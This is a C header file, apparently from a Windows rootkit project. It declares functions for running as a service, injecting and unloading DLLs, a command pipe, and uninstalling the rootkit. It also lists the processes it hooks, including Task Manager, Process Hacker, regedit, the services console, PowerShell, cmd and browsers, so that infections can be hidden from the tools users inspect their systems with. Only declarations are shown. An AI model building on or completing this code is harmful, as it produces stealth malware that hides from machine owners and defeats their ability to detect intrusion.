#ifndef _SERVICES_H
#define _SERVICES_H

#define SLEEP_TIME 5000
#define SLEEP_DELAY 500    // 500 = 0.5 seconds

const wchar_t* processToHook[] = {
    L"ProcessHacker.exe",
    L"Taskmgr.exe",
    L"explorer.exe",
    L"mmc.exe",          // services.msc
    L"powershell.exe",
    L"cmd.exe",
    L"msedge.exe",
    L"chrome.exe",
    L"regedit.exe"
};

typedef struct BlackListedPID {
    DWORD pid;
    struct BlackListedPID* next;
} BlackListedPID;

typedef struct {
    BlackListedPID* head;
} BlackList;


BlackList* CreateBlackList();
void AddToBlackList(BlackList* list, DWORD pid);
int IsBlackListed(BlackList* list, DWORD pid);
DWORD* GetPIDsAndAddToBlacklist(const wchar_t** processNames, int processCount, int* numPIDs, BlackList* blackList);
void FreeBlackList(BlackList* list);
int InjectDLL(DWORD pid);
DWORD WINAPI StartPipe(LPVOID lpParam);
int StartRkService();
void ServiceMain(int argc, char** argv);
void ControlHandler(DWORD request);
DWORD GetPID(LPCWSTR pn);
VOID UninstallRK();
int UnloadDLL(DWORD pid, LPCWSTR dllName);

#endif